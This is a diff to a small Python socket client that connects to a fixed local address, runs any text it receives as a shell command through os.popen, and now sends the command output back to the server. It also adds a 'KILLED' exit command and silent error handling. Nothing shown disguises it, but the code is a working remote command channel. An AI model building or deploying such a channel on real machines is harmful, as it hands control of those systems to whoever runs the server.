@@ -7,6 +7,7 @@ import os
 isConnected = 0
 sock = None
 running = 1
+inputThread = None
 isSetup = 0
 server_address = ('192.168.1.8', 10000)
 
@@ -54,12 +55,12 @@ def running():
 ###END running
 
 def setupThreadOne():
-    global isSetup
+    global isSetup, inputThread
     ##Strating daemons
     if isSetup == 0:
         try:
            inputThread = threading.Thread(target=inputFunc)
-           inputThread.daemon = 0
+           inputThread.daemon = 1
            inputThread.start()
            isSetup = 1
         except Exception:
@@ -84,9 +85,14 @@ def disconnect():
 ###END disconnect
 
 def exitClient(args):
-    global running
+    global running, isSetup
     disconnect()
+    isSetup = 0
     running = 0
+    try:
+        inputThread.join(2)
+    except Exception:
+        None
 ###END exit
 
 def runCommand(command, args):
@@ -120,17 +126,27 @@ def processCommand(cmd, args):
         disconnect()
     elif cmd == "DROPPED":
         disconnect()
+    elif cmd == "KILLED":
+        print("Killed")
+        exitClient(None)
     else:
         args = ' '.join(args)
         mess = cmd + " " + args
-        print("Got: ", mess)
-        os.system(mess)
+        #print("Got: ", mess)
+        retur = os.popen(mess).read()
+        try:
+            sock.send(retur.encode())
+        except Exception:
+            None
 
 
 ###END processCommand
 def recvFunc():
     while isConnected:
-        mess = sock.recv(1024).decode()
+        try:
+            mess = sock.recv(1024).decode()
+        except Exception:
+            None
         line = mess.split()
         if len(line) >= 1:
             cmd = line[0]
